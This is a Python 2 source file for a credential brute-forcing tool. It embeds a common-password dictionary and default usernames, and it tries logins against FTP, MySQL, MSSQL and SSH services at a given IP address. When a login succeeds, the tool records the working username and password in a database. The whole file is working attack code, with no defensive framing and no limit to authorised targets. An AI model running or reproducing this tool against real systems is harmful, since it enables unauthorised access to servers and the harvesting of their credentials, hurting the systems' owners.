# encoding-utf-8
'''
@author:pureboy
'''
from sqlDB import SQLConnect
import ftplib
import time
import json
import socket
import threading
import MySQLdb
import pymssql
import paramiko
import traceback
PASSWORD_DIC = ['123456','123pyj','hlpureboy','admin','root','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2016','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','fuckyou','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!','p@ssw0rd!','password1','r00t','tomcat','apache','system']
USER_DIC = {
    "ftp":['www','admin','root','db','wwwroot','data','web','ftp'],
    "mysql":['root'],
    "mssql":['sa'],
    "ssh":['administrator','admin','root']
}
def is_online(ip,port):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((ip,port))
        s.close()
        return True
    except Exception,e:
        return False
def mssql(ip,port=1433):
    if not is_online(ip,port):
        return json.dumps(dict(status="0", dec="the ip or port is not open"))
    for name in USER_DIC["mssql"]:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', name))
            try:
                pymssql.connect(server=ip,user=name,password=pass_,port=port)
                SQLConnect.insertepwd(ip, port, name + '&' + pass_)
                return json.dumps(dict(status="1", user=name, pwd=pass_))
            except Exception, e:
                pass
                #print traceback.print_exc()
    return json.dumps(dict(status="0", dec="sorry, no engoch passwords"))
def ftp(ip,port=21):
    if not is_online(ip,21):
        return json.dumps(dict(status="0",dec="the ip or port is not open"))
    for name in USER_DIC["ftp"]:
        for pass_ in PASSWORD_DIC:
            pass_=str(pass_.replace('{user}',name))
            try:
                ftp_=ftplib.FTP()
                ftp_.connect(ip,port)
                ftp_.login(name,pass_)
                ftp_.quit()
                SQLConnect.insertepwd(ip,port, name + '&' + pass_)
                data=dict(status="1",user=name,pwd=pass_)
                return data
            except Exception,e:
                pass
    return json.dumps(dict(status="0",dec="sorry, no engoch passwords"))
def mysql(ip,port=3306):
    if not is_online(ip,port):
        return json.dumps(dict(status="0", dec="the ip or port is not open"))
    for name in USER_DIC["mysql"]:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', name))
            try:
                MySQLdb.connect(host=ip,port=port,user=name,passwd=pass_)
                SQLConnect.insertepwd(ip, port, name+'&'+pass_)
                return json.dumps(dict(status="1",user=name,pwd=pass_))
            except Exception,e:
                pass
    return json.dumps(dict(status="0", dec="sorry, no engoch passwords"))
def ssh(ip,port=22):
    if not is_online(ip, port):
        return json.dumps(dict(status="0", dec="the ip or port is not open"))
    for name in USER_DIC["ssh"]:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', name))
            try:
                p=paramiko.SSHClient()
                p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                p.connect(hostname=ip,port=port,username=name,password=pass_,allow_agent=False,look_for_keys=False,timeout=3)
                SQLConnect.insertepwd(ip, port, name + '&' + pass_)
                return json.dumps(dict(status="1", user=name, pwd=pass_))
            except Exception,e:
                pass
                #print traceback.print_exc()
    return json.dumps(dict(status="0", dec="sorry, no engoch passwords"))